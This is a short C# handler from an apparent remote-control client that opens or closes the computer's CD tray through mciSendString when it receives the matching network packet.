using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using RemoteControl.Protocals;
using Microsoft.Win32;
using RemoteControl.Protocals.Response;
using RemoteControl.Protocals.Request;
using System.Windows.Forms;
using RemoteControl.Protocals.Utilities;

namespace RemoteControl.Client.Handlers
{
    [PacketType(ePacketType.PACKET_OPEN_CD_REQUEST)]
    [PacketType(ePacketType.PACKET_CLOSE_CD_REQUEST)]
    class RequestOpeCDHandler : IRequestHandler
    {
        public void Handle(SocketSession session, ePacketType reqType, object reqObj)
        {
            if (reqType == ePacketType.PACKET_OPEN_CD_REQUEST)
            {
                try
                {
                    Win32API.mciSendString("Set cdaudio door open wait", "", 0, IntPtr.Zero);//打开
                }
                catch (Exception ex)
                {
                    Console.WriteLine(ex.Message);
                }
            }
            else if (reqType == ePacketType.PACKET_CLOSE_CD_REQUEST)
            {
                try
                {
                    Win32API.mciSendString("Set cdaudio door Closed wait", "", 0, IntPtr.Zero);//关闭
                }
                catch (Exception ex)
                {
                    Console.WriteLine(ex.Message);
                }
            }
        }
    }
}
